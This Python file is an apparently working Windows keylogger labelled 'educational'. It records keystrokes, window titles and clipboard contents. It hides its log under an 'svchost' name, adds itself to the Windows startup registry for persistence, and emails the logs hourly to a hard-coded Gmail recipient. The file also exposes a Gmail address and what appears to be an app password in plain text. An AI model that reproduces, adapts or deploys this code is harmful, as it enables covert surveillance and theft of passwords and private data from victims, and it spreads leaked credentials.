"""
Educational Keylogger Script
============================

DISCLAIMER:
This script is for educational purposes only. Unauthorized use of keyloggers or
monitoring tools is illegal and unethical. Use responsibly and only with explicit
consent from users.

Features:
- Logs keystrokes and clipboard data.
- Sends logs to an email address periodically.
- Registers itself to run at system startup.

Modules:
- pynput: For listening to keyboard events.
- pyperclip: For clipboard monitoring.
- smtplib: For email functionality.
- winreg: For registry modifications.
"""

import os
import sys
import time
import threading
from datetime import datetime
import smtplib
from email.message import EmailMessage
from dotenv import load_dotenv, find_dotenv
from pynput.keyboard import Key, Listener
import pyperclip
import winreg as reg
import win32gui

def get_active_window():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

# Globals
#log_file_path = "config.txt"

# Get the user's AppData\Local directory dynamically
log_file_path = os.path.join(os.getenv('LOCALAPPDATA'), "svchost_log.txt")
current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
window = get_active_window()
current_user = os.getenv("USERNAME")
email_interval = 3600

'''
# Load environment variables
if getattr(sys, "frozen", False):
    # the app is frozen -- comp with pyins
    bundle_dir = os.path.dirname(sys.executable)
else:
    # running in a norm py environ
    bundle_dir = os.path.dirname(os.path.abspath(__file__))

env_path = os.path.join(bundle_dir, '.env')

if os.path.exists(env_path):
    load_dotenv(env_path)
    print(".env file loaded successfully")
else:
    print("Error: .env file not found")
'''

load_dotenv()

# EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
# EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
# RECIPIENT_EMAIL = os.getenv("RECIPIENT_EMAIL")

EMAIL_ADDRESS = "damolaap@gmail.com"
EMAIL_PASSWORD = "vsikvtwyocheyndn"
RECIPIENT_EMAIL = "apexp8379@gmail.com"

if not all([EMAIL_ADDRESS, EMAIL_PASSWORD, RECIPIENT_EMAIL]):
    raise ValueError("Email credentials or recipient email not found.")

def notify_script_started():
    try:
        msg = EmailMessage()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = RECIPIENT_EMAIL
        msg["Subject"] = f'Logarithm has started on: {current_user}'
        msg.set_content(f'Logs would be sent in intervals of: {email_interval/60} minute(s)')

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            #server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
            
        print("[INFO] Email sent successfully.")
    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")

def add_to_startup():
    """Adds this script to Windows startup registry."""
    try:
        # Get the path of the executable
        if getattr(sys, "frozen", False):
            path = sys.executable
        else:
            #path = os.path.realpath(__file__)
            path = os.path.abspath(__file__)

        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg.CreateKey(reg.HKEY_CURRENT_USER, key)
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE) as reg_key:
            reg.SetValueEx(reg_key, "svchost", 0, reg.REG_SZ, path)
        print("[INFO] Added to startup.")
    except Exception as e:
        print(f"[ERROR] Failed to add to startup: {e}")

def send_email(log_file_path):
    """Sends an email with the specified subject, body, and optional attachment."""
    try:
        msg = EmailMessage()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = RECIPIENT_EMAIL
        msg["Subject"] = 'Logs :)'
        msg.set_content('Attached are the latest logs')

        with open(log_file_path, "rb") as file:
            file_data = file.read()
            file_name = os.path.basename(log_file_path)
    
            msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            #server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
            
        print("[INFO] Email sent successfully.")
    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")

def periodic_email_sender(interval, log_file_path):
    count = 0
    while True:
        time.sleep(interval)
        send_email(log_file_path)
        count += 1
        if count >= 24:
            os.remove(log_file_path)

def on_press(key):
    """Callback function to record key press."""

    try:

        # Record alphanumeric keys
        with open(log_file_path, "r") as file:
            if len(file.read()) > 0:
                with open(log_file_path, "a") as file:
                    file.write(f"{key.char}")
            elif len(file.read()) == 0:
                with open(log_file_path, "a") as file:
                    file.write(f"{window} : {current_time} : {key.char}")
            
    except AttributeError:
        # Record special keys (e.g., Shift, Enter)
        with open(log_file_path, "a") as file:
            if key == Key.space:
                file.write(" ")
            elif key == Key.enter:
                file.write(f"\n{window} : {current_time} : ")
            elif key == Key.shift or key == Key.shift_r:
                pass
            elif key == Key.backspace:
                with open(log_file_path, "r") as file:
                    content = file.read()
                    # Remove the last character
                    updated_content = content[:-1]

                    # Write the updated content back to the file
                    with open(log_file_path, "w") as file:
                        file.write(updated_content)
            else:
                file.write(f" [{key}] ")

def monitor_clipboard():

    previous_clipboard = ""
    while True:
        try:
            current_clipboard = pyperclip.paste()
        except Exception as e:
            current_clipboard = ""
            print(f"[ERROR] Clipboard access error: {e}")
        if current_clipboard != previous_clipboard:
            with open(log_file_path, "r") as file:
                if len(file.read()) > 0:
                    with open(log_file_path, "a", encoding="utf-8") as file:
                        file.write(f"\n[Clipboard] : {current_time} : {current_clipboard}\n{window} : {current_time} : ")
                else:
                    with open(log_file_path, "a", encoding="utf-8") as file:
                        file.write(f"[Clipboard] : {current_time} : {current_clipboard}\n{window} : {current_time} : ")
            previous_clipboard = current_clipboard
        time.sleep(1)  # Check clipboard every second

def on_release(key):
    """Stop the keylogger when the Escape key is pressed."""
    if key == Key.esc:
        return False
    
def start_listener():
    """Starts the keyboard listener."""
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def main():
    """Main function."""
    notify_script_started()

    startup_thread = threading.Thread(target=add_to_startup, daemon=True)
    startup_thread.start()

    with open(log_file_path, "a"):
        pass

    # Start the keylogger listener
    keylogger_thread = threading.Thread(target=start_listener, daemon=True)
    keylogger_thread.start()

    # Start the clipboard monitoring thread
    clip_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clip_thread.start()

    # Start the email sender thread (e.g., every hour)
    email_thread = threading.Thread(target=periodic_email_sender, args=(email_interval, log_file_path), daemon=True)
    email_thread.start()

    # Keep the main thread alive
    keylogger_thread.join()

if __name__ == "__main__":
    main()
